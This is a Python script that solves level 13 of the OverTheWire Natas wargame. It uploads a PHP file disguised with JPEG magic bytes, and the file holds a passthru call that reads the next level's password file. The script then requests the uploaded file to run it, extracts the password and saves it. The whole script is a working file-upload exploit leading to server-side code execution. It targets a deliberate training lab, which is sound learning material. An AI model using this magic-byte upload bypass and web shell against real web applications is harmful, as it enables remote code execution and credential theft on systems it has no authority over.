import re,base64,requests,natas

USER='natas13'
PASSWORD=natas.get_credential(USER)

URL='http://natas13.natas.labs.overthewire.org/'
PAYLOAD='-----------------------------208637385607827912102593443\nContent-Disposition: form-data; name="MAX_FILE_SIZE"\n\n1000\n-----------------------------208637385607827912102593443\nContent-Disposition: form-data; name="filename"\n\nvvx2fum75y.php\n-----------------------------208637385607827912102593443\nContent-Disposition: form-data; name="uploadedfile"; filename="test.php"\nContent-Type: application/text\n\n%s\n<?php\n    passthru(\'cat /etc/natas_webpass/natas14\');\n?>\n%s\n\n-----------------------------208637385607827912102593443--'

def main():
    b64 = base64.b64encode('%s:%s' % (USER,PASSWORD))

    response = requests.post (
            '%sindex.php' % URL,
            headers= {
                'Authorization':'Basic %s' % b64,
                'Content-Type':'multipart/form-data; boundary=---------------------------208637385607827912102593443'
            },
            data=PAYLOAD % ('\xff\xd8\xff\xee','\xff\xd8\xff\xdb')
    )
    
    regex=r"href=\"(\w+\/\w+\.php)\""
    matches = re.finditer(regex,response.content,re.MULTILINE)
    
    print response.content

    filename = None
    for match in matches:
        filename = match.group(1)

    if filename is None:
        print('failed to find filename')
        exit
    
    print('%s was uploaded succesfully' % filename)

    response = requests.get (
            '%s%s' % (URL,filename),
            headers=dict(Authorization='Basic %s' % b64)
    )
    password=response.content.replace('\n','').replace('\xff\xd8\xff\xee','').replace('\xff\xd8\xff\xdb','')

    print('password found: %s' % password)
    print('adding to credentials....')
    natas.save_credentials('natas14',password)
    print('done')

if __name__=='__main__':
    main()
